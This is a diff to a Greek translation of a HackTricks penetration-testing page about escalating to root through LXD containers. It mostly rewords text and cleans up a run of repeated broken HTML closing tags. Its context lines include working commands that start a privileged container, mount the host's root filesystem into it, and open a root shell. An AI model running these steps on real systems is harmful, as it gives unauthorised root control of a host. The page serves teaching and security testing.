@@ -63,7 +63,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 {% hint style="danger" %}
 Αν βρείτε αυτό το σφάλμα _**Σφάλμα: Δεν βρέθηκε πισίνα αποθήκευσης. Παρακαλώ δημιουργήστε μια νέα πισίνα αποθήκευσης**_\
-Τρέξτε **`lxd init`** και **επαναλάβετε** το προηγούμενο κομμάτι εντολών
+Εκτελέστε **`lxd init`** και **επαναλάβετε** το προηγούμενο κομμάτι εντολών
 {% endhint %}
 
 Τέλος, μπορείτε να εκτελέσετε το κοντέινερ και να αποκτήσετε root:
@@ -74,7 +74,7 @@ lxc exec privesc /bin/sh
 ```
 ### Μέθοδος 2
 
-Δημιουργήστε μια εικόνα Alpine και ξεκινήστε την χρησιμοποιώντας τη σημαία `security.privileged=true`, αναγκάζοντας το κοντέινερ να αλληλεπιδρά ως root με το σύστημα αρχείων του host.
+Δημιουργήστε μια εικόνα Alpine και ξεκινήστε την χρησιμοποιώντας την επιλογή `security.privileged=true`, αναγκάζοντας το κοντέινερ να αλληλεπιδρά ως root με το σύστημα αρχείων του κεντρικού υπολογιστή.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -93,118 +93,18 @@ lxc init myimage mycontainer -c security.privileged=true
 
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
-
-<div data-gb-custom-block data-tag="hint" data-style='success'>
-
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+```
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Υποστηρίξτε το HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
-
-</div>
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-</details>
-
-</div>
-
-hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</div>
-
-</details>
-
-</div>
-```
-
+{% endhint %}
